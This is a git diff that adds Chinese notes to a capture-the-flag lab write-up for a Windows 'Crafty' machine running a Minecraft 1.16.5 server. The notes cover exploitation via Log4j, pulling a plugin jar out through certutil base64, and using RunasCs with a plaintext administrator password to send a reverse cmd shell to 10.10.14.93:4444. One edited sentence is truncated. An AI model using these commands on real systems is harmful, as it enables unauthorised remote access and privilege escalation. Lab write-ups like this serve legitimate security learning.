@@ -1,4 +1,37 @@
 ## Crafty
+### 总结
+```
+Nmap枚举的时候，只有两个端口，其中一个还被隐藏端口25565是Minecraft服务器
+遇到的问题就是反弹不成功，基本上这个靶机就是靠使用工具
+
+[1]横向突破的时候找到C:\Users\svc minecraft\server\plugins目录的playercounter-1.0-SNAPSHOT.jar
+
+c:\Users\svc_minecraft\server\plugins>icacls playercounter-1.0-SNAPSHOT.jar 
+icacls playercounter-1.0-SNAPSHOT.jar
+playercounter-1.0-SNAPSHOT.jar NT AUTHORITY\SYSTEM:(I)(F)
+                               BUILTIN\Administrators:(I)(F)
+                               CRAFTY\svc_minecraft:(I)(RX)
+//icacls 是 Windows 自带的命令行工具，专门用来：👉 查看、修改文件或目录的访问控制权限（ACL）
+用户/组	权限
+SYSTEM	(F) = Full control 全权限
+Administrators	(F) = 管理员全权限
+CRAFTY\svc_minecraft	(RX) = 只读 + 执行
+
+[2]
+C:\temp>certutil -encode playercounter-1.0-SNAPSHOT.jar b64.txt //将插件转换为base64，复制到本地再恢复原来的文件
+[★]$ cat b64.txt | base64 -d > playerconuter-1.0-SNAPSHOT.jar
+[★]$ file playerconuter-1.0-SNAPSHOT.jar
+playerconuter-1.0-SNAPSHOT.jar: Java archive data (JAR)
+
+[3]在线反编译器来反编译插件返回到源代码https://www.javadecompilers.com/
+
+[4]为了在没有适当shell的情况下使用RunAs特性，我们利用runasc
+https://github.com/antonioCoco/RunasCs
+[★]$ wget https://github.com/antonioCoco/RunasCs/releases/download/v1.5/RunasCs.zip
+
+[5]C:\temp>.\RunasCs.exe -l 2 administrator s67u84zKq8IXw cmd -r 10.10.14.93:4444
+//Logon type = 2（交互式登录）；要启动cmd.exe 连接到-r 10.10.14.93:4444
+```
 ```
 [★]$ nmap -sV -sC 10.129.230.193
 Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-01-27 07:55 CST
@@ -45,7 +78,7 @@ PORT      STATE SERVICE   VERSION
 Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
 ```
 #### Nmap显示只有两个端口是打开的。在80端口上，IIS正在运行“Official Crafty”网站”，端口25565是Minecraft服务器。我们将从80端口开始。
-#### 根据nmap的输出，我们知道版本是1.16.5。搜索Minecraft漏洞让我们找到了这个链接。Minecraft宣布Log4j的开发已经完成在多个版本的服务器版游戏中发现，并建议升级受影响的游戏包。
+#### 根据nmap的输出，我们知道版本是1.16.5。搜索Minecraft漏洞让我们找到了这个链接。已经完成在多个版本的服务器版游戏中发现，并建议升级受影响的游戏包。
 https://help.minecraft.net/hc/en-us/articles/4416199399693-Security-Vulnerability-in-Minecraft-Java-Edition
 #### 为了测试我们是否可以利用这个服务器，我们需要下载一个兼容的Minecraft客户端用这个版本。我们可以在这里下载一个基本的客户端。我们试着设置一个空密码，看看是否需要进行身份验证。
 ```
@@ -149,6 +182,7 @@ whoami
  sent 7, rcvd 0
 ```
 #### 反弹连接不成功，这是官方文档使用的RogueJndi-1.1.jar，下面换成log4j-shell-poc
+#### Minecraft Java 版中包含的、可被利用的 Java 库的名称是什么？log4j
 -------------------------
 #### 我的世界https://github.com/MCCTeam/Minecraft-Console-Client
 #### Java SE 8 Archive Downloads (JDK 8u202 and earlier)：
@@ -558,7 +592,7 @@ import net.kronos.rkon.core.Rcon;
 import net.kronos.rkon.core.ex.AuthenticationException;
 import org.bukkit.plugin.java.JavaPlugin;
 
-public final class Playercounter extends JavaPlugin {
+public final class Playercounter extends JavaPlugin { //Playercounter 这个类 继承自 JavaPlugin，是整个 Bukkit / Spigot / Paper 插件的入口点
    public void onEnable() {
       Rcon rcon = null;
 
